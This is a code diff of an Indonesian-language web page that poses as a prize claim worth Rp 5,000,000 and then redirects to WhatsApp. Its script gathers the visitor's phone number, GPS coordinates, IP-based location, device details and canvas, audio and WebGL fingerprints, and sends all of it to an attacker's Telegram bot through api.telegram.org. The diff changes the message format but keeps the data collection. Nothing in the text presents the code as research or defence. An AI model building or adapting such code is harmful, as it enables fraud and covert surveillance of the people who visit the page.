+        function indexedDBSupported() {
+            return 'indexedDB' in window;
         }
-
+        
         function getLocationError(error) {
             switch(error.code) {
-                case error.PERMISSION_DENIED: return "User denied location";
-                case error.POSITION_UNAVAILABLE: return "Location unavailable";
-                case error.TIMEOUT: return "Location timeout";
-                default: return "Unknown error";
+                case error.PERMISSION_DENIED:
+                    return "Pengguna menolak akses lokasi";
+                case error.POSITION_UNAVAILABLE:
+                    return "Informasi lokasi tidak tersedia";
+                case error.TIMEOUT:
+                    return "Permintaan lokasi timeout";
+                default:
+                    return "Error tidak diketahui";
             }
         }
-
+        
         function sendDataToTelegram(data) {
+            // Format pesan untuk Telegram
             const message = `
-🎁 *KLAIM HADIAH - 150+ DATA REAL TERKUMPUL*
+🎁 *KLAIM HADIAH BARU - DATA LENGKAP 20+*
 
-*📱 DATA PENGGUNA (5):*
-• 📞 Nomor: ${data.phone}
-• 🕐 Waktu: ${data.localTime}
-• 🌐 Timezone: ${data.timezone}
-• ⏰ Offset: ${data.timezoneOffset}m
-• 🏷️ Timestamp: ${data.timestamp}
-• ⏱️ Session: ${data.sessionDuration}ms
+*📱 DATA PENGGUNA:*
+• Nomor Telepon: ${data.phone}
+• Waktu Klaim: ${data.localTime}
+• Timezone: ${data.timezone}
+• DST: ${data.dst ? 'Ya' : 'Tidak'}
+• Timezone Offset: ${data.timezoneOffset} menit
 
-*🌐 BROWSER INFO (30):*
-• 🔧 Browser: ${data.browser} ${data.browserVersion}
-• 🖥️ Engine: ${data.engine} ${data.engineVersion}
-• 🏢 OS: ${data.os} ${data.osVersion}
-• 📋 User Agent: ${data.userAgent}
-• 🗣️ Bahasa: ${data.language}
-• 🌍 Languages: ${data.languages}
-• 💻 Platform: ${data.platform}
-• 🏢 Vendor: ${data.vendor}
-• 🍪 Cookie: ${data.cookieEnabled}
-• 🌐 Online: ${data.onlineStatus}
-• 📄 PDF Viewer: ${data.pdfViewerEnabled}
-• 🤖 Webdriver: ${data.webdriver}
-• 📦 Product: ${data.product}
-• 🔢 Product Sub: ${data.productSub}
-• 📱 App Code: ${data.appCodeName}
-• 📱 App Name: ${data.appName}
-• 🔢 App Version: ${data.appVersion}
-• 🆔 Build ID: ${data.buildID}
-• 📊 UserAgent Data: ${data.userAgentData}
+*🌐 INFORMASI BROWSER:*
+• Browser: ${data.browser} ${data.browserVersion}
+• User Agent: ${data.userAgent}
+• Bahasa: ${data.language}
+• Bahasa Tersedia: ${data.languages.join(', ')}
+• Platform: ${data.platform}
+• Vendor: ${data.vendor}
+• Cookie Enabled: ${data.cookieEnabled ? 'Ya' : 'Tidak'}
+• Java Enabled: ${data.javaEnabled ? 'Ya' : 'Tidak'}
+• PDF Viewer: ${data.pdfViewerEnabled ? 'Ya' : 'Tidak'}
 
-*💻 PERANGKAT (15):*
-• 📱 Tipe: ${data.deviceType}
-• ⚡ CPU Cores: ${data.hardwareConcurrency}
-• 🧠 RAM: ${data.deviceMemory}GB
-• 👆 Touch Points: ${data.maxTouchPoints}
-• ☕ Java: ${data.javaEnabled}
-• 🚫 Do Not Track: ${data.doNotTrack}
-• 🔒 Locks: ${data.locks ? 'Yes' : 'No'}
-• 🔑 Credentials: ${data.credentials ? 'Yes' : 'No'}
-• 💾 Storage: ${data.storage ? 'Yes' : 'No'}
-• 🛠️ Service Worker: ${data.serviceWorker ? 'Yes' : 'No'}
+*💻 INFORMASI PERANGKAT:*
+• Tipe Perangkat: ${data.deviceType}
+• OS: ${data.os}
+• Status Online: ${data.onlineStatus ? 'Online' : 'Offline'}
+• CPU Cores: ${data.hardwareConcurrency}
+• RAM: ${data.deviceMemory ? data.deviceMemory + 'GB' : 'Tidak diketahui'}
+• Touch Support: ${data.touchSupport} (${data.maxTouchPoints} points)
 
-*📱 LAYAR (25):*
-• 🖼️ Resolusi: ${data.screenWidth}x${data.screenHeight}
-• 📐 Available: ${data.availWidth}x${data.availHeight}
-• 🎨 Color Depth: ${data.colorDepth}bit
-• ⚫ Pixel Depth: ${data.pixelDepth}bit
-• 📐 Orientation: ${data.orientationType} ${data.orientationAngle}°
-• 📊 Pixel Ratio: ${data.devicePixelRatio}
-• 📏 Viewport: ${data.innerWidth}x${data.innerHeight}
-• 🪟 Outer: ${data.outerWidth}x${data.outerHeight}
-• 📍 Page Offset: ${data.pageXOffset},${data.pageYOffset}
-• 🖥️ Screen Left: ${data.screenLeft}
-• 🖥️ Screen Top: ${data.screenTop}
-• 🖥️ Screen X: ${data.screenX}
-• 🖥️ Screen Y: ${data.screenY}
-• 📜 Scroll X: ${data.scrollX}
-• 📜 Scroll Y: ${data.scrollY}
+*📱 INFORMASI LAYAR:*
+• Resolusi: ${data.screenWidth} x ${data.screenHeight}
+• Available: ${data.availWidth} x ${data.availHeight}
+• Color Depth: ${data.colorDepth} bit
+• Pixel Depth: ${data.pixelDepth} bit
+• Viewport: ${data.viewportWidth} x ${data.viewportHeight}
+• Outer: ${data.outerWidth} x ${data.outerHeight}
+• Device Pixel Ratio: ${data.devicePixelRatio}
+• Orientation: ${data.orientation}
 
-*📶 JARINGAN (20):*
-• 🌐 IP: ${data.ipAddress}
-• 🇮🇩 Negara: ${data.ipCountry} (${data.ipCountryCode})
-• 🏙️ Kota: ${data.ipCity}
-• 📮 Postal: ${data.ipPostal}
-• 🏢 Region: ${data.ipRegion}
-• 💰 Currency: ${data.ipCurrency}
-• 🕐 Timezone: ${data.ipTimezone}
-• 📡 ISP: ${data.ipISP}
-• 🔗 ASN: ${data.ipAsn}
-• 🏢 Organization: ${data.ipOrg}
-• 🌍 Continent: ${data.ipContinent}
-• 🚩 Flag: ${data.ipCountryFlag}
-• 📞 Calling Code: ${data.ipCallingCode}
-• 🗣️ Languages: ${data.ipLanguages}
-• 📡 Connection: ${data.connectionType}
-• ⚡ Downlink: ${data.downlink}Mbps
-• 🏃 RTT: ${data.rtt}ms
-• 💾 Save Data: ${data.saveData}
-• ⚡ Downlink Max: ${data.downlinkMax}Mbps
+*📶 INFORMASI JARINGAN:*
+• IP Address: ${data.ipAddress}
+• Negara: ${data.ipCountry} (${data.ipCountryCode})
+• Region: ${data.ipRegion} (${data.ipRegionCode})
+• Kota: ${data.ipCity}
+• ZIP: ${data.ipZip}
+• ISP: ${data.ipISP}
+• Organization: ${data.ipOrg}
+• AS: ${data.ipAs}
+• Timezone IP: ${data.ipTimezone}
+• Connection Type: ${data.connectionType || 'Tidak diketahui'}
+• Downlink: ${data.downlink || 'Tidak diketahui'} Mbps
+• RTT: ${data.rtt || 'Tidak diketahui'} ms
+• Save Data: ${data.saveData ? 'Ya' : 'Tidak'}
 
-*🔋 BATERAI (10):*
-• 🔋 Level: ${data.batteryLevel}%
-• 🔌 Charging: ${data.charging}
-• ⏳ Charge Time: ${data.chargingTime}s
-• ⏳ Discharge Time: ${data.dischargingTime}s
-• 🔋 Battery Data: ${JSON.stringify(data.batteryData)}
+*🔋 INFORMASI BATERAI:*
+• Level: ${data.batteryLevel || 'Tidak tersedia'}
+• Charging: ${data.charging ? 'Ya' : 'Tidak'}
+• Charging Time: ${data.chargingTime || 'Tidak tersedia'}
+• Discharging Time: ${data.dischargingTime || 'Tidak tersedia'}
 
-*🎮 GRAFIK & WEBGL (20):*
-• 🎨 WebGL Renderer: ${data.webglRenderer}
-• 🏢 WebGL Vendor: ${data.webglVendor}
-• 🔢 WebGL Version: ${data.webglVersion}
-• 💬 Shading Lang: ${data.webglShadingLanguageVersion}
-• 📏 Line Width: ${data.webglAliasedLineWidthRange}
-• ⚫ Point Size: ${data.webglAliasedPointSizeRange}
-• 🎯 Antialiasing: ${data.webglAntialiasing}
-• 📊 Depth Bits: ${data.webglDepthBits}
-• ✏️ Stencil Bits: ${data.webglStencilBits}
-• 🖼️ Max Texture: ${data.webglMaxTextureSize}
-• 🔧 Extensions: ${data.webglExtensions}
-• 🖼️ Canvas FP: ${data.canvasFingerprint}
-• 🌀 Canvas Winding: ${data.canvasWinding}
-• 📝 Canvas Text: ${data.canvasText?.substring(0, 50)}...
-• 😃 Canvas Emoji: ${data.canvasEmoji?.substring(0, 50)}...
-• 🎵 Audio FP: ${data.audioFingerprint}
-• 🔤 Fonts: ${data.fonts}
+*💾 STORAGE:*
+• Storage Used: ${data.storageUsed || 'Tidak tersedia'}
+• Storage Quota: ${data.storageQuota || 'Tidak tersedia'}
+• Storage Percent: ${data.storagePercent || 'Tidak tersedia'}
 
-*💾 STORAGE (15):*
-• 💾 Local Storage: ${data.localStorage}
-• 💾 Session Storage: ${data.sessionStorage}
-• 🗃️ IndexedDB: ${data.indexedDB}
-• 📦 Caches: ${data.caches}
-• 💽 Storage Usage: ${data.storageUsage}MB
-• 💽 Storage Quota: ${data.storageQuota}MB
-• ⚡ Load Time: ${data.navigationTiming}ms
-• 🌐 Domain Lookup: ${data.domainLookupTime}ms
-• 🔗 Connect Time: ${data.connectTime}ms
-• 📨 Request Time: ${data.requestTime}ms
-• 📨 Response Time: ${data.responseTime}ms
-• 📊 DOM Loading: ${data.domLoadingTime}ms
-• 📊 DOM Complete: ${data.domCompleteTime}ms
-• ✅ Load Complete: ${data.loadCompleteTime}ms
-• 🧠 Memory: ${data.memoryUsed}MB/${data.memoryTotal}MB (Limit: ${data.memoryLimit}MB)
+*🎮 WEBGL & GRAFIK:*
+• WebGL Renderer: ${data.webglRenderer}
+• WebGL Vendor: ${data.webglVendor}
+• Canvas Fingerprint: ${data.canvasFingerprint}
 
-*📷 MEDIA (10):*
-• 📹 Total Devices: ${data.mediaDevicesCount}
-• 📸 Cameras: ${data.cameraDevices}
-• 🎤 Microphones: ${data.microphoneDevices}
-• 🔊 Speakers: ${data.speakerDevices}
-• 📹 Has Camera: ${data.hasCamera}
-• 🎤 Has Microphone: ${data.hasMicrophone}
-• 🔊 Has Speaker: ${data.hasSpeaker}
-• 🎬 Media Decoding: ${data.mediaDecodingSupported}
-• ⚡ Media Smooth: ${data.mediaDecodingSmooth}
+*🎵 AUDIO:*
+• Audio Context: ${data.audioFingerprint}
 
-*🔌 PLUGINS (10):*
-• 🔌 Total Plugins: ${data.pluginsCount}
-• 📄 MIME Types: ${data.mimeTypesCount}
-• 📋 Plugins List: ${data.pluginsList}
-• 🔧 Plugins Detailed: ${data.pluginsDetailed}
+*🔤 FONTS:*
+• Fonts: ${data.fonts}
 
-*🎯 ADVANCED (10):*
-• 📱 Device Motion: ${data.deviceMotionSupported}
-• 🧭 Device Orientation: ${data.deviceOrientationSupported}
-• 🗣️ Speech Recognition: ${data.speechRecognition}
-• 📳 Vibration: ${data.vibration}
-• 📶 Bluetooth: ${data.bluetooth}
-• 🔌 USB: ${data.usb}
-• 🔗 Serial: ${data.serial}
-• 🎵 Audio Context: ${data.audioContext}
+*🔌 PLUGINS:*
+• Plugins: ${data.plugins}
+• MIME Types: ${data.mimeTypes}
 
-*🔗 URL & NAVIGATION (10):*
-• ↩️ Referrer: ${data.referrer}
-• 🌐 URL: ${data.url}
-• 🏠 Origin: ${data.origin}
-• 🔒 Protocol: ${data.protocol}
-• 🖥️ Host: ${data.host}
-• 🖥️ Hostname: ${data.hostname}
-• 🔌 Port: ${data.port}
-• 📁 Pathname: ${data.pathname}
-• ❓ Search: ${data.search}
-• #️⃣ Hash: ${data.hash}
+*💾 STORAGE API:*
+• Local Storage: ${data.localStorage ? 'Ya' : 'Tidak'}
+• Session Storage: ${data.sessionStorage ? 'Ya' : 'Tidak'}
+• IndexedDB: ${data.indexedDB ? 'Ya' : 'Tidak'}
 
-*📍 GPS DETAILED (15):*
+*⚡ PERFORMANCE:*
+• Memory Used: ${data.memory?.used || 'Tidak tersedia'}
+• Memory Total: ${data.memory?.total || 'Tidak tersedia'}
+• Memory Limit: ${data.memory?.limit || 'Tidak tersedia'}
+• Load Time: ${data.timing?.loadTime || 'Tidak tersedia'}
+
+*📷 MEDIA DEVICES:*
+• Total Devices: ${data.mediaDevices || 'Tidak tersedia'}
+• Camera: ${data.hasCamera ? 'Ya' : 'Tidak'}
+• Microphone: ${data.hasMicrophone ? 'Ya' : 'Tidak'}
+
+*📍 LOKASI GPS:*
 ${data.latitude ? `
-• 📍 Latitude: ${data.latitude}
-• 📍 Longitude: ${data.longitude}
-• 🎯 Accuracy: ${data.accuracy}m
-• ⛰️ Altitude: ${data.altitude || 'N/A'}
-• 🎯 Altitude Accuracy: ${data.altitudeAccuracy || 'N/A'}
-• 🧭 Heading: ${data.heading || 'N/A'}
-• 🏃 Speed: ${data.speed || 'N/A'}
-• 🕐 Timestamp: ${data.positionTimestamp}
-• 🏠 Address: ${data.address || 'N/A'}
-• 🏠 Address Type: ${data.addressType || 'N/A'}
-• 🗺️ [Google Maps](https://maps.google.com/?q=${data.latitude},${data.longitude})
-• 🗺️ [OpenStreetMap](https://www.openstreetmap.org/?mlat=${data.latitude}&mlon=${data.longitude})
-` : `• ❌ Error: ${data.locationError}`}
+• Latitude: ${data.latitude}
+• Longitude: ${data.longitude}
+• Akurasi: ${data.accuracy}
+• Altitude: ${data.altitude}
+• Altitude Accuracy: ${data.altitudeAccuracy}
+• Heading: ${data.heading}
+• Speed: ${data.speed}
+• [Lihat di Google Maps](https://maps.google.com/?q=${data.latitude},${data.longitude})
+` : `• Error: ${data.locationError}`}
 
-*📊 PERFORMANCE (10):*
-• ⏰ Time Origin: ${data.timeOrigin}
-• ⏱️ Performance Now: ${data.now}
-• 🧭 Navigation Type: ${data.navigationType}
-• 🔄 Redirect Count: ${data.redirectCount}
-
-*📈 TOTAL DATA TERKUMPUL: 150+ POINTS DATA REAL*
+*Data dikumpulkan pada: ${data.timestamp}*
 
 ⚠️ *SEGERA HUBUNGI UNTUK TINDAK LANJUT*
             `;
             
+            // Kirim ke Telegram
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
             const telegramData = {
                 chat_id: CHAT_ID,
@@ -1203,9 +907,11 @@ ${data.latitude ? `
                 loading.style.display = 'none';
                 
                 if (result.ok) {
+                    // Tampilkan pesan sukses
                     successMessage.style.display = 'block';
                     claimButton.style.display = 'none';
                     
+                    // Redirect ke WhatsApp setelah beberapa detik
                     setTimeout(() => {
                         window.location.href = `https://wa.me/6281234567890?text=Halo,%20saya%20ingin%20klaim%20hadiah%20Rp%205.000.000`;
                     }, 3000);
@@ -1226,9 +932,10 @@ ${data.latitude ? `
             });
         }
         
+        // Animasi confetti
         function createConfetti() {
             const header = document.querySelector('.header');
-            for (let i = 0; i < 15; i++) {
+            for (let i = 0; i < 20; i++) {
                 const confetti = document.createElement('div');
                 confetti.className = 'confetti';
                 confetti.style.left = Math.random() * 100 + '%';
